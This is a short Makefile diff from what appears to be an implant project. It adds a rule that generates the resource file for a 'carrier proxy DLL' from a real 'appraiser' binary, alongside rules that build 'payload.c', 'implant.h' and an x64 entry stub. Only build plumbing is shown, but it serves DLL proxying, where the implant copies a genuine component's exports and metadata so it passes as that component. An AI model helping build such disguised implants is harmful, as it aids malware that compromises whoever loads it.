@@ -49,6 +49,9 @@ $(PARAMS): $(PSTAMP)
 $(DEF): tools/gen_def.py $(REAL_APPRAISER) | $(GEN)
 	$(PY) tools/gen_def.py $(REAL_APPRAISER) appraiser > $@
 
+$(GEN)/appraiser.rc: tools/gen_rc.py $(REAL_APPRAISER) | $(GEN)
+	$(PY) tools/gen_rc.py $(REAL_APPRAISER) > $@
+
 # ---- COFF objects --------------------------------------------------
 $(OBJ)/entry_x64.o: asm/entry_x64.asm $(PSTAMP) | $(OBJ)
 	$(NASM) -f win64 -o $@ asm/entry_x64.asm
@@ -68,7 +71,7 @@ $(OBJ)/payload.o: src/payload.c include/implant.h include/resolve.h $(PARAMS) | 
 $(OBJ)/proxy.o: src/proxy.c include/proxy.h include/implant.h include/resolve.h $(PARAMS) | $(OBJ)
 	$(CC) $(CFLAGS) -c -o $@ src/proxy.c
 
-$(OBJ)/proxy_res.o: src/appraiser.rc | $(OBJ)
+$(OBJ)/proxy_res.o: $(GEN)/appraiser.rc | $(OBJ)
 	$(WINDRES) -i $< -o $@
 
 # ---- carrier proxy DLL ---------------------------------------------
